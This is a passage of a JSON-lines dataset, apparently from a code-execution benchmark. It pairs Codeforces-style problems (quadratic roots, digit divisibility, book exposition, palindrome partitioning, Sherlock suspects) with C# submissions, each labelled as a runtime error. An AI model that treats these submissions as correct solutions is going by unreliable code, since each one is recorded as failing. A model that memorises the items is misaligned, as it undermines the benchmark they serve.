the type described above for all the possible pairs of numbers b and c such that 1\u2009\u2264\u2009b\u2009\u2264\u2009n, 1\u2009\u2264\u2009c\u2009\u2264\u2009m. Help Petya find that number.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains two integers n and m. (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u20095000000).","output_spec":"Print a single number which is the number of real roots of the described set of equations.","notes":"NoteIn the second test from the statement the following equations are analysed: b\u2009=\u20091, c\u2009=\u20091: x2\u2009+\u20092x\u2009+\u20091\u2009=\u20090; The root is x\u2009=\u2009\u2009-\u20091 b\u2009=\u20091, c\u2009=\u20092: x2\u2009+\u20092x\u2009+\u20092\u2009=\u20090; No roots Overall there's one rootIn the second test the following equations are analysed: b\u2009=\u20091, c\u2009=\u20091: x2\u2009+\u20092x\u2009+\u20091\u2009=\u20090; The root is x\u2009=\u2009\u2009-\u20091 b\u2009=\u20091, c\u2009=\u20092: x2\u2009+\u20092x\u2009+\u20092\u2009=\u20090; No roots b\u2009=\u20091, c\u2009=\u20093: x2\u2009+\u20092x\u2009+\u20093\u2009=\u20090; No roots b\u2009=\u20092, c\u2009=\u20091: x2\u2009+\u20094x\u2009+\u20091\u2009=\u20090; The roots are  b\u2009=\u20092, c\u2009=\u20092: x2\u2009+\u20094x\u2009+\u20092\u2009=\u20090; The roots are  b\u2009=\u20092, c\u2009=\u20093: x2\u2009+\u20094x\u2009+\u20093\u2009=\u20090; The roots are x1\u2009=\u2009\u2009-\u20093,\u2009x2\u2009=\u2009\u2009-\u20091 b\u2009=\u20093, c\u2009=\u20091: x2\u2009+\u20096x\u2009+\u20091\u2009=\u20090; The roots are  b\u2009=\u20093, c\u2009=\u20092: x2\u2009+\u20096x\u2009+\u20092\u2009=\u20090; The roots are  b\u2009=\u20093, c\u2009=\u20093: x2\u2009+\u20096x\u2009+\u20093\u2009=\u20090; The roots are  Overall there are 13 roots and as the root \u2009-\u20091 is repeated twice, that means there are 12 different roots.","sample_inputs":["3 3","1 2"],"sample_outputs":["12","1"]}
{"difficulty":1600,"lang":"Mono C#","lang_cluster":"c#","src_uid":"b263917e47e1c84340bcb1c77999fd7e","submission_id":"re_1367","tags":["constructive algorithms","greedy","math","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace ConsoleApplication1\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            int Count = int.Parse(Console.ReadLine());\n            int[] Numb = new int[10];\n            int Sum = 0; bool clow = false;\n            String[] Input = Console.ReadLine().Split(' ');\n            for (int i = 0; i < Count; i++)\n            {\n                int t = int.Parse(Input[i]);\n                Numb[t]++;\n                Sum += t;\n            }\n            if (Numb[0] != 0)\n            {\n                for (int i = 9; i > -1; i--)\n                {\n                    if ((Numb[i] != 0) && (i > 4))\n                    {\n                        break;\n                    }\n                    else\n                    {\n                        if ((Numb[i] > 1) && (i > 0))\n                        {\n                            break;\n                        }\n                        else\n                        {\n                            if (i == 0)\n                            {\n                                Console.Write(0);\n                                clow = true;\n                            }\n                        }\n                    }\n                }\n                if (clow!=true)\n                {\n                if ((Sum % 3 != 0) && (Sum > 9))\n                {\n                    if (Sum % 3 == 1)\n                    {\n                        bool flag = false;\n                        for (int i = 1; i < 10; i += 3)\n                        {\n                            if (Numb[i] != 0)\n                            {\n                                Numb[i]--;\n                                flag = true;\n                                break;\n                            }\n                        }\n                        if (flag != true)\n                        {\n                            int m = 0;\n                            for (int i = 2; i < 10; i += 3)\n                            {\n                                if (m != 2)\n                                {\n                                    while ((Numb[i] > 0) || (m != 2))\n                                    {\n                                        Numb[i]--;\n                                        m++;\n                                    }\n                                }\n                                else\n                                {\n                                    if (m == 2)\n                                    {\n                                        break;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    else\n                    {\n                        if (Sum % 3 == 2)\n                        {\n                            bool flag = false;\n                            for (int i = 2; i < 10; i += 3)\n                            {\n                                if (Numb[i] != 0)\n                                {\n                                    Numb[i]--;\n                                    flag = true;\n                                    break;\n                                }\n                            }\n                            if (flag != true)\n                            {\n                                int m = 0;\n                                for (int i = 1; i < 10; i += 3)\n                                {\n                                    if (m != 2)\n                                    {\n                                        while ((Numb[i] > 0) || (m != 2))\n                                        {\n                                            Numb[i]--;\n                                            m++;\n                                        }\n                                    }\n                                    else\n                                    {\n                                        if (m == 2)\n                                        {\n                                            break;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    }\n                }\n                for (int i = 9; i > -1; i--)\n                {\n                    while (Numb[i] != 0)\n                    {\n                        Console.Write(i);\n                        Numb[i]--;\n                    }\n                }\n            }\n            else\n            {\n                if (clow == false)\n                {\n                    Console.Write(-1);\n                }\n            }\n           \n        }\n    }\n}\n","description":"Furik loves math lessons very much, so he doesn't attend them, unlike Rubik. But now Furik wants to get a good mark for math. For that Ms. Ivanova, his math teacher, gave him a new task. Furik solved the task immediately. Can you?You are given a set of digits, your task is to find the maximum integer that you can make from these digits. The made number must be divisible by 2, 3, 5 without a residue. It is permitted to use not all digits from the set, it is forbidden to use leading zeroes.Each digit is allowed to occur in the number the same number of times it occurs in the set.","input_from":"standard input","output_to":"standard output","input_spec":"A single line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100000) \u2014 the number of digits in the set. The second line contains n digits, the digits are separated by a single space. ","output_spec":"On a single line print the answer to the problem. If such number does not exist, then you should print -1.","notes":"NoteIn the first sample there is only one number you can make \u2014 0. In the second sample the sought number is 5554443330. In the third sample it is impossible to make the required number.","sample_inputs":["1\n0","11\n3 4 5 4 5 3 5 3 4 4 0","8\n3 2 5 1 5 2 2 3"],"sample_outputs":["0","5554443330","-1"]}
{"difficulty":1900,"lang":"MS C#","lang_cluster":"c#","src_uid":"bc8b4b74c2f2d486e2d2f03982ef1013","submission_id":"re_246","tags":["two pointers","dsu","data structures","binary search","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\n\nnamespace cf_BooksExposition\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            string[] line = Console.ReadLine().Split(' ');\n            int n = Convert.ToInt32(line[0]);\n            int k = Convert.ToInt32(line[1]);\n            line = Console.ReadLine().Split(' ');\n            int[] nums = line.Select(s => Convert.ToInt32(s)).ToArray();\n\n            \/\/int k = 5;\n            \/\/int[] nums = new int[] { 8, 19,14, 10, 13,8};\n            int l;\n            var list = BooksExposition(k, nums, out l);\n            Console.WriteLine(l + \" \" + list.Count);\n            foreach (int i in list)\n            {\n                Console.WriteLine((i + 1) + \" \" + (i + l));\n\n\n            }\n\n\n\n        }\n\n        private static List<int> BooksExposition(int k, int[] nums, out int l)\n        {\n            LinkedList<int> maxlist = new LinkedList<int>();\n            LinkedList<int> minlist = new LinkedList<int>();\n\n            l = 1;\n\n            maxlist.AddLast(0);\n            minlist.AddLast(0);\n            int i = 0;\n            List<int> results = new List<int>();\n            results.Add(0);\n            for (int j = 1; j < nums.Length; j++)\n            {\n                while (maxlist.Count > 0 && nums[j] > nums[maxlist.Last.Value])\n                {\n                    maxlist.RemoveLast();\n                }\n                if (maxlist.Count == 0 || nums[j] != nums[maxlist.Last.Value])\n                    maxlist.AddLast(j);\n\n                while (minlist.Count > 0 && nums[j] < nums[minlist.Last.Value])\n                {\n                    minlist.RemoveLast();\n                }\n                if (minlist.Count == 0 || nums[j] != nums[minlist.Last.Value])\n                    minlist.AddLast(j);\n\n                while (nums[maxlist.First.Value] - nums[minlist.First.Value] > k)\n                {\n                    if (minlist.First.Value < maxlist.First.Value)\n                    {\n                        i = minlist.First.Value + 1;\n                        minlist.RemoveFirst();\n                    }\n                    else\n                    {\n                        i = maxlist.First.Value + 1;\n                        maxlist.RemoveFirst();\n                        if (minlist.First.Value == maxlist.First.Value)\n                            minlist.RemoveFirst();\n                    }\n\n                }\n\n                if (j - i + 1 > l)\n                {\n                    l = j - i + 1;\n                    results.Clear();\n                    results.Add(i);\n                }\n                else if (j - i + 1 == l)\n                {\n                    results.Add(i);\n                }\n            }\n            return results;\n        }\n    }\n}\n","description":"There are several days left before the fiftieth birthday of a famous Berland's writer Berlbury. In this connection the local library decided to make an exposition of the works of this famous science-fiction writer. It was decided as well that it is necessary to include into the exposition only those books that were published during a particular time period. It is obvious that if the books differ much in size, the visitors will not like it. That was why the organizers came to the opinion, that the difference between the highest and the lowest books in the exposition should be not more than k millimeters.The library has n volumes of books by Berlbury, arranged in chronological order of their appearance. The height of each book in millimeters is know, it is hi. As Berlbury is highly respected in the city, the organizers want to include into the exposition as many books as possible, and to find out what periods of his creative work they will manage to cover. You are asked to help the organizers cope with this hard task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two integer numbers separated by a space n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) and k (0\u2009\u2264\u2009k\u2009\u2264\u2009106) \u2014 the amount of books by Berlbury in the library, and the maximum allowed height difference between the lowest and the highest books. The second line contains n integer numbers separated by a space. Each number hi (1\u2009\u2264\u2009hi\u2009\u2264\u2009106) is the height of the i-th book in millimeters.","output_spec":"In the first line of the output data print two numbers a and b (separate them by a space), where a is the maximum amount of books the organizers can include into the exposition, and b \u2014 the amount of the time periods, during which Berlbury published a books, and the height difference between the lowest and the highest among these books is not more than k milllimeters. In each of the following b lines print two integer numbers separated by a space \u2014 indexes of the first and the last volumes from each of the required time periods of Berlbury's creative work.","notes":null,"sample_inputs":["3 3\n14 12 10","2 0\n10 10","4 5\n8 19 10 13"],"sample_outputs":["2 2\n1 2\n2 3","2 1\n1 2","2 1\n3 4"]}
{"difficulty":1800,"lang":"Mono C#","lang_cluster":"c#","src_uid":"bfbd7a73e65d240ee7e8c83cc68ca0a1","submission_id":"re_489","tags":["math"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeff\/\/#undef DEBUG\n\nusing System;\nusing System.Collections.Generic;\nusing System.Text;\nusing System.Diagnostics;\n\nnamespace codeforces\n{\n    class C\n    {\n        \/\/  test\n        static CodeforcesUtils CF = new CodeforcesUtils(\n@\"\n3\n1 2 4\n\");\n\n        class Solver\n        {\n            public void Solve()\n            {\n                \/\/\n                int n = int.Parse(CF.ReadLine());\n                string[] ss = CF.ReadLine().Split(' ');\n                List<int> ns = new List<int>();\n                foreach (string s in ss)\n                {\n                    ns.Add(int.Parse(s));\n                }\n                \/\/\n                int a = ns[ns.Count - 1] + 2;\n                int b = ns.Count+1;\n\n                for (int i = 0; i < ns.Count; i++)\n                {\n                    int a1 = ns[i] + 1;\n                    int b1 = i + 1;\n\n                    if (a1 * b == a * b1)\n                    {\n                        CF.WriteLine(\"unique\");\n                        CF.WriteLine(ns[ns.Count-1]+1);\n                        return;\n                    }\n                }\n                CF.WriteLine(\"not unique\");\n            }\n        }\n           \n        \n        #region test\n\n        static void Main(string[] args)\n        {\n            System.Threading.Thread.CurrentThread.CurrentCulture = new System.Globalization.CultureInfo(\"ru-RU\");\n\n            new Solver().Solve();\n            CF.Close();\n        }\n\n        static void TLE()\n        {\n            for (; ; ) ;\n        }\n\n        class CodeforcesUtils\n        {\n            public string ReadLine()\n            {\n#if DEBUG\n                if (_lines == null)\n                {\n                    _lines = new List<string>();\n                    string[] ss = _test_input.Replace(\"\\n\", \"\").Split('\\r');\n                    for (int i = 0; i < ss.Length; i++)\n                    {\n                        if (\n                            (i == 0 || i == ss.Length - 1) &&\n                            ss[i].Length == 0\n                            )\n                            continue;\n\n                        _lines.Add(ss[i]);\n                    }\n                }\n\n                string s = null;\n                if (_lines.Count > 0)\n                {\n                    s = _lines[0];\n                    _lines.RemoveAt(0);\n                }\n                return s;\n\n#else\n                \/\/return _sr.ReadLine();\n            return Console.In.ReadLine();\n#endif\n            }\n\n            public void WriteLine(object o)\n            {\n#if DEBUG\n                System.Diagnostics.Trace.WriteLine(o);\n#else\n                \/\/_sw.WriteLine(o);\n            Console.WriteLine(o);\n#endif\n            }\n\n            public void Write(object o)\n            {\n#if DEBUG\n                System.Diagnostics.Trace.Write(o);\n#else\n                 \/\/_sw.Write(o);\n           Console.Write(o);\n#endif\n            }\n\n\n            string _test_input;\n\n            List<string> _lines;\n\n#if DEBUG\n            public CodeforcesUtils(string test_input)\n            {\n                _test_input = test_input;\n            }\n#else\n\n            public CodeforcesUtils(string dummy)\n            {\n                \/\/_sr = new System.IO.StreamReader(\"input.txt\");\n                \/\/_sw = new System.IO.StreamWriter(\"output.txt\");\n            }\n#endif\n\n            public void Close()\n            {\n                if( _sr!= null)\n                    _sr.Close();\n                if( _sw != null)\n                    _sw.Close();\n            }\n\n            System.IO.StreamReader _sr=null;\n            System.IO.StreamWriter _sw=null;\n          \n        }\n\n        #endregion\n    }\n}\n","description":"Every year a race takes place on the motorway between cities A and B. This year Vanya decided to take part in the race and drive his own car that has been around and bears its own noble name \u2014 The Huff-puffer.So, Vasya leaves city A on the Huff-puffer, besides, at the very beginning he fills the petrol tank with \u03b1 liters of petrol (\u03b1\u2009\u2265\u200910 is Vanya's favorite number, it is not necessarily integer). Petrol stations are located on the motorway at an interval of 100 kilometers, i.e. the first station is located 100 kilometers away from the city A, the second one is 200 kilometers away from the city A, the third one is 300 kilometers away from the city A and so on. The Huff-puffer spends 10 liters of petrol every 100 kilometers. Vanya checks the petrol tank every time he passes by a petrol station. If the petrol left in the tank is not enough to get to the next station, Vanya fills the tank with \u03b1 liters of petrol. Otherwise, he doesn't stop at the station and drives on. For example, if \u03b1\u2009=\u200943.21, then the car will be fuelled up for the first time at the station number 4, when there'll be 3.21 petrol liters left. After the fuelling up the car will have 46.42 liters. Then Vanya stops at the station number 8 and ends up with 6.42\u2009+\u200943.21\u2009=\u200949.63 liters. The next stop is at the station number 12, 9.63\u2009+\u200943.21\u2009=\u200952.84. The next stop is at the station number 17 and so on. You won't believe this but the Huff-puffer has been leading in the race! Perhaps it is due to unexpected snow. Perhaps it is due to video cameras that have been installed along the motorway which register speed limit breaking. Perhaps it is due to the fact that Vanya threatened to junk the Huff-puffer unless the car wins. Whatever the reason is, the Huff-puffer is leading, and jealous people together with other contestants wrack their brains trying to think of a way to stop that outrage.One way to do this is to mine the next petrol station where Vanya will stop. Your task is to calculate at which station this will happen and warn Vanya. You don't know the \u03b1 number, however, you are given the succession of the numbers of the stations where Vanya has stopped. Find the number of the station where the next stop will be.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000) which represents the number of petrol stations where Vanya has stopped. The next line has n space-separated integers which represent the numbers of the stations. The numbers are positive and do not exceed 106, they are given in the increasing order. No two numbers in the succession match. It is guaranteed that there exists at least one number \u03b1\u2009\u2265\u200910, to which such a succession of stops corresponds.","output_spec":"Print in the first line \"unique\" (without quotes) if the answer can be determined uniquely. In the second line print the number of the station where the next stop will take place. If the answer is not unique, print in the first line \"not unique\".","notes":"NoteIn the second example the answer is not unique. For example, if \u03b1\u2009=\u200910, we'll have such a sequence as 1, 2, 3, and if \u03b1\u2009=\u200914, the sequence will be 1, 2, 4.","sample_inputs":["3\n1 2 4","2\n1 2"],"sample_outputs":["unique\n5","not unique"]}
{"difficulty":1900,"lang":"MS C#","lang_cluster":"c#","src_uid":"c1de33ee9bb05db090c4d23ec9994f72","submission_id":"re_775","tags":["dp","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nnamespace Codeforces.TaskD\n{\n    public class Task\n    {\n        public static void Main()\n        {\n            var task = new Task();\n            task.Solve();\n        }\n\n        private void Solve()\n        {\n            string text;\n            long k;\n            Input.Next(out text);\n            Input.Next(out k);\n            long n = text.Length;\n\n            var corrections = new long[n, n + 1];\n\n            for (var i = 0; i < n; i++)\n                for (var j = i + 1; j < n; j++)\n                    for (var t = 0; t < (j - i + 1) \/ 2; t++)\n                        corrections[i, j - i + 1] += text[i + t] == text[j - t] ? 0 : 1;\n\n            var dp = new long[n + 1, k + 1];\n            for (var i = 0; i <= n; i++)\n            {\n                for (var j = 0; j <= k; j++)\n                    dp[i, j] = long.MaxValue \/ 2;\n                dp[i, 0] = 0;\n                dp[i, 1] = corrections[0, i];\n            }\n            for (var i = 0; i <= k; i++) dp[0, i] = 0;\n\n            for (var count = 1; count < k; count++)\n            {\n                for (var l = 0; l <= n; l++)\n                {\n                    for (var len = 1; l + len <= n; len++)\n                    {\n                        dp[l + len, count + 1] = Math.Min(dp[l + len, count + 1], dp[l, count] + corrections[l, len]);\n                    }\n                }\n            }\n\n            var min = long.MaxValue;\n            var minIndex = -1;\n            for (var i = 1; i <= k; i++)\n                if (dp[n, i] < min)\n                {\n                    min = dp[n, i];\n                    minIndex = i;\n                }\n            Console.WriteLine(min);\n\n            var prev = n;\n            var answers = new List<string>();\n            for (var j = 1; j <= minIndex; j++)\n            {\n                var m = 100000L;\n                for (var i = prev - 1; i > 0; i--)\n                {\n                    if (dp[i, minIndex - j] + corrections[i, prev - i] > min) continue;\n                    m = i;\n                }\n                answers.Add(text.Substring((int)m, (int)(prev - m)));\n                prev = m;\n                min = dp[m, minIndex - j];\n            }\n            if (prev > 0) answers.Add(text.Substring(0, (int)(prev)));\n\n            answers.Reverse();\n            for (var i = 0; i < answers.Count; i++)\n                answers[i] = answers[i].Substring(0, (answers[i].Length + 1)\/2) + new string(answers[i].Substring(0, (answers[i].Length)\/2).Reverse().ToArray());\n            \n            Console.WriteLine(string.Join(\"+\", answers));\n        }\n    }\n\n    #region Input\n\n    public class Input\n    {\n        private static string _line;\n\n        public static bool Next()\n        {\n            _line = Console.ReadLine();\n            return !string.IsNullOrEmpty(_line);\n        }\n\n        public static bool Next(out long a)\n        {\n            bool ok = Next();\n            a = ok ? long.Parse(_line) : 0;\n            return ok;\n        }\n\n        public static bool Next(out long a, out long b)\n        {\n            bool ok = Next();\n            if (ok)\n            {\n                long[] array = _line.Split(' ').Select(long.Parse).ToArray();\n                a = array[0];\n                b = array[1];\n            }\n            else\n            {\n                a = b = 0;\n            }\n\n            return ok;\n        }\n\n        public static bool Next(out long a, out long b, out long c)\n        {\n            bool ok = Next();\n            if (ok)\n            {\n                long[] array = _line.Split(' ').Select(long.Parse).ToArray();\n                a = array[0];\n                b = array[1];\n                c = array[2];\n            }\n            else\n            {\n                a = b = c = 0;\n            }\n            return ok;\n        }\n\n        public static bool Next(out long a, out long b, out long c, out long d)\n        {\n            bool ok = Next();\n            if (ok)\n            {\n                long[] array = _line.Split(' ').Select(long.Parse).ToArray();\n                a = array[0];\n                b = array[1];\n                c = array[2];\n                d = array[3];\n            }\n            else\n            {\n                a = b = c = d = 0;\n            }\n            return ok;\n        }\n\n        public static bool Next(out long a, out long b, out long c, out long d, out long e)\n        {\n            bool ok = Next();\n            if (ok)\n            {\n                long[] array = _line.Split(' ').Select(long.Parse).ToArray();\n                a = array[0];\n                b = array[1];\n                c = array[2];\n                d = array[3];\n                e = array[4];\n            }\n            else\n            {\n                a = b = c = d = e = 0;\n            }\n            return ok;\n        }\n\n        public static List<long> Numbers()\n        {\n            Next();\n            if (string.IsNullOrEmpty(_line)) return new List<long>();\n            return _line.Split(' ').Select(long.Parse).ToList();\n        }\n\n        public static bool Next(out string value)\n        {\n            value = string.Empty;\n            if (!Next()) return false;\n            value = _line;\n            return true;\n        }\n    }\n\n    #endregion\n}","description":"Friday is Polycarpus' favourite day of the week. Not because it is followed by the weekend, but because the lessons on Friday are 2 IT lessons, 2 math lessons and 2 literature lessons. Of course, Polycarpus has prepared to all of them, unlike his buddy Innocentius. Innocentius spent all evening playing his favourite game Fur2 and didn't have enough time to do the literature task. As Innocentius didn't want to get an F, he decided to do the task and read the book called \"Storm and Calm\" during the IT and Math lessons (he never used to have problems with these subjects). When the IT teacher Mr. Watkins saw this, he decided to give Innocentius another task so that the boy concentrated more on the lesson and less \u2014 on the staff that has nothing to do with IT. Mr. Watkins said that a palindrome is a string that can be read the same way in either direction, from the left to the right and from the right to the left. A concatenation of strings a, b is a string ab that results from consecutive adding of string b to string a. Of course, Innocentius knew it all but the task was much harder than he could have imagined. Mr. Watkins asked change in the \"Storm and Calm\" the minimum number of characters so that the text of the book would also be a concatenation of no more than k palindromes. Innocentius can't complete the task and therefore asks you to help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains a non-empty string s which is the text of \"Storm and Calm\" (without spaces). The length of the string s does not exceed 500 characters. String s consists of uppercase and lowercase Latin letters. The second line contains a single number k (1\u2009\u2264\u2009k\u2009\u2264\u2009|s|, where |s| represents the length of the string s).","output_spec":"Print on the first line the minimum number of changes that Innocentius will have to make. Print on the second line the string consisting of no more than k palindromes. Each palindrome should be non-empty and consist of uppercase and lowercase Latin letters. Use the character \"+\" (ASCII-code 43) to separate consecutive palindromes. If there exist several solutions, print any of them. The letters' case does matter, that is an uppercase letter is not considered equivalent to the corresponding lowercase letter.","notes":null,"sample_inputs":["abacaba\n1","abdcaba\n2","abdcaba\n5","abacababababbcbabcd\n3"],"sample_outputs":["0\nabacaba","1\nabdcdba","0\na+b+d+c+aba","1\nabacaba+babab+bcbabcb"]}
{"difficulty":1600,"lang":"Mono C#","lang_cluster":"c#","src_uid":"c761bb69cf1b5a3dbe38d9f5c46e9007","submission_id":"re_183","tags":["data structures","constructive algorithms","implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.IO;\n\nnamespace CF156B {\n\tclass Program {\n\t\tstatic void Main(string[] args) {\n\n#if DEBUG\n\t\t\tTextReader reader = new StreamReader(\"..\/..\/input5.txt\");\n#else\n\t\t\tTextReader reader = Console.In;\n#endif\n\t\t\tvar ints = reader.ReadLine().Split(' ').Select(s => int.Parse(s)).ToArray();\n\t\t\tbyte[] peoples = new byte[ints[0]];\n\t\t\tint rightPeoplesCount = ints[1];\n\t\t\tint[] opinions = peoples.Select(i => int.Parse(reader.ReadLine())).ToArray();\n\t\t\t\n\t\t\tHashSet<int> impossibleMurders = new HashSet<int>();\n\t\t\tint lastPossibleSolution = -1;\n\t\t\tfor (int i = 0; i < peoples.Length; i++) {\n\t\t\t\tint countTruth = 0;\n\t\t\t\t\/\/ is it unpossible\n\t\t\t\tforeach (var opinion in opinions) {\n\t\t\t\t\tif (opinion > 0) {\n\t\t\t\t\t\tif (opinion == i + 1)\n\t\t\t\t\t\t\tcountTruth++;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tif (-opinion != i + 1) \n\t\t\t\t\t\t\tcountTruth++;\n\t\t\t\t\t}\n\t\t\t\t\tif (countTruth > rightPeoplesCount)\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tif (countTruth != rightPeoplesCount)\n\t\t\t\t\timpossibleMurders.Add(i + 1);\n\t\t\t\telse\n\t\t\t\t\tlastPossibleSolution = i + 1;\n\n\t\t\t}\n\n\t\t\tif (impossibleMurders.Count == peoples.Length - 1) {\n\t\t\t\tfor (int i = 0; i < opinions.Length; i++) {\n\t\t\t\t\tif (opinions[i] == lastPossibleSolution)\n\t\t\t\t\t\tpeoples[i] = 2;\n\t\t\t\t\telse\n\t\t\t\t\t\tpeoples[i] = 1;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tfor (int i = 0; i < opinions.Length; i++) {\n\t\t\t\t\tif (opinions[i] > 0 && impossibleMurders.Contains(opinions[i]))\n\t\t\t\t\t\tpeoples[i] = 1;\n\t\t\t\t\tif (opinions[i] < 0 && impossibleMurders.Contains(-opinions[i]))\n\t\t\t\t\t\tpeoples[i] = 2;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tvar answrs = new string[]{\"Not defined\", \"Lie\", \"Truth\" };\n\t\t\tArray.ForEach(peoples, i => Console.WriteLine(answrs[i]));\n\n#if DEBUG\n\t\t\tConsole.ReadKey();\n#endif\n\n\t\t}\n\t}\n}\n","description":"As Sherlock Holmes was investigating a crime, he identified n suspects. He knows for sure that exactly one of them committed the crime. To find out which one did it, the detective lines up the suspects and numbered them from 1 to n. After that, he asked each one: \"Which one committed the crime?\". Suspect number i answered either \"The crime was committed by suspect number ai\", or \"Suspect number ai didn't commit the crime\". Also, the suspect could say so about himself (ai\u2009=\u2009i).Sherlock Holmes understood for sure that exactly m answers were the truth and all other answers were a lie. Now help him understand this: which suspect lied and which one told the truth?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009n) \u2014 the total number of suspects and the number of suspects who told the truth. Next n lines contain the suspects' answers. The i-th line contains either \"+ai\" (without the quotes), if the suspect number i says that the crime was committed by suspect number ai, or \"-ai\" (without the quotes), if the suspect number i says that the suspect number ai didn't commit the crime (ai is an integer, 1\u2009\u2264\u2009ai\u2009\u2264\u2009n). It is guaranteed that at least one suspect exists, such that if he committed the crime, then exactly m people told the truth.","output_spec":"Print n lines. Line number i should contain \"Truth\" if suspect number i has told the truth for sure. Print \"Lie\" if the suspect number i lied for sure and print \"Not defined\" if he could lie and could tell the truth, too, depending on who committed the crime.","notes":"NoteThe first sample has the single person and he confesses to the crime, and Sherlock Holmes knows that one person is telling the truth. That means that this person is telling the truth.In the second sample there are three suspects and each one denies his guilt. Sherlock Holmes knows that only two of them are telling the truth. Any one of them can be the criminal, so we don't know for any of them, whether this person is telling the truth or not.In the third sample the second and the fourth suspect defend the first and the third one. But only one is telling the truth, thus, the first or the third one is the criminal. Both of them can be criminals, so the second and the fourth one can either be lying or telling the truth. The first and the third one are lying for sure as they are blaming the second and the fourth one.","sample_inputs":["1 1\n+1","3 2\n-1\n-2\n-3","4 1\n+2\n-3\n+4\n-1"],"sample_outputs":["Truth","Not defined\nNot defined\nNot defined","Lie\nNot defined\nLie\nNot defined"]}
{"difficulty":1900,"lang":"Mono C#","lang_cluster":"c#","src_uid":"cb082cbe9b34a45da851b6764bbc30c3","submission_id":"re_996","tags":["brute force","sortings","greedy","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Text;\n\nclass Fffuuuu {\n\n    Char[] last;\n\n    Int32 Have(Int32 dig, Int32 delta, Int32[] stat) {\n        Int32 have = 0;\n        if (dig - delta >= 0) {\n            have += stat[dig - delta];\n        }\n        if (dig + delta < 10) {\n            have += stat[dig + delta];\n        }\n        return have;\n    }\n\n    Int32 Pick(String str, Int32 dig, Int32[] stat, Int32 toChange) {\n        Int32[] accDist = new Int32[10];\n        toChange -= stat[dig];\n        for (Int32 pick, dist = 1; toChange != 0; ++dist) {\n            if (dig - dist >= 0) {\n                pick = Math.Min(toChange, stat[dig - dist]);\n                accDist[dist] += pick;\n                toChange -= pick;\n            }\n            if (dig + dist < 10) {\n                pick = Math.Min(toChange, stat[dig + dist]);\n                accDist[dist] += pick;\n                toChange -= pick;\n            }\n        }\n\n        Int32 score = 0;\n        for (Int32 delta, cur, i = 0; i < str.Length; ++i) {\n            cur = str[i] & 0xf;\n            delta = Math.Abs(cur - dig);\n            if (accDist[delta] != 0) {\n                if (cur > dig || accDist[delta] == Have(dig, delta, stat)) {\n                    score += delta;\n                    --accDist[delta];\n                    --stat[cur];\n                    cur = dig;\n                } else {\n                    --stat[cur];\n                }\n            }\n            last[i] = (Char) (cur | 0x30);\n        }\n\n        return score;\n    }\n\n    public Fffuuuu() {\n        Int32 toChange = Int32.Parse(Console.ReadLine().Split(' ')[1]);\n        String str = Console.ReadLine();\n        Int32[] stat = new Int32[10];\n        for (Int32 i = 0; i < str.Length; ++stat[str[i++] & 0xf]) { }\n\n        Int32 best = -1;\n        String bestString = String.Empty;\n        last = new Char[str.Length];\n        for (Int32 one, dig = 0; dig < 10; ++dig) {\n            one = Pick(str, dig, (Int32[]) stat.Clone(), toChange);\n            if (best < 0 || best > one || (best == one && (new String(last).CompareTo(bestString) < 0))) {\n                best = one;\n                bestString = new String(last);\n            }\n        }\n        Console.WriteLine(best);\n        Console.WriteLine(bestString);\n    }\n\n    static void Main() {\n#if DEBUG\n        Console.SetIn(new System.IO.StreamReader(\"in.txt\"));\n#endif\n        new Fffuuuu();\n    }\n\n}","description":"A car number in Berland consists of exactly n digits. A number is called beautiful if it has at least k equal digits. Vasya wants to change the digits in his car's number so that the number became beautiful. To replace one of n digits Vasya has to pay the sum of money, equal to the absolute difference between the old digit and the new one.Help Vasya: find the minimum sum of money he should pay to make the number of his car beautiful. You should also find the resulting beautiful number. If there are several such numbers, then print the lexicographically minimum one.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and k (2\u2009\u2264\u2009n\u2009\u2264\u2009104,\u20092\u2009\u2264\u2009k\u2009\u2264\u2009n) which represent how many digits the number has and how many equal digits a beautiful number should have. The second line consists of n digits. It describes the old number of Vasya's car. It is guaranteed that the number contains no spaces and only contains digits.","output_spec":"On the first line print the minimum sum of money Vasya needs to change the number. On the second line print the car's new number. If there are several solutions, print the lexicographically minimum one.","notes":"NoteIn the first sample replacing the second digit with an \"8\" costs |9\u2009-\u20098|\u2009=\u20091. Replacing the fifth digit with an \"8\" costs the same. Replacing the sixth digit costs |6\u2009-\u20098|\u2009=\u20092. As a result, Vasya will pay 1\u2009+\u20091\u2009+\u20092\u2009=\u20094 for a beautiful number \"888188\".The lexicographical comparison of strings is performed by the &lt; operator in modern programming languages. The string x is lexicographically smaller than the string y, if there exists such i (1\u2009\u2264\u2009i\u2009\u2264\u2009n), that xi\u2009&lt;\u2009yi, and for any j (1\u2009\u2264\u2009j\u2009&lt;\u2009i) xj\u2009=\u2009yj. The strings compared in this problem will always have the length n.","sample_inputs":["6 5\n898196","3 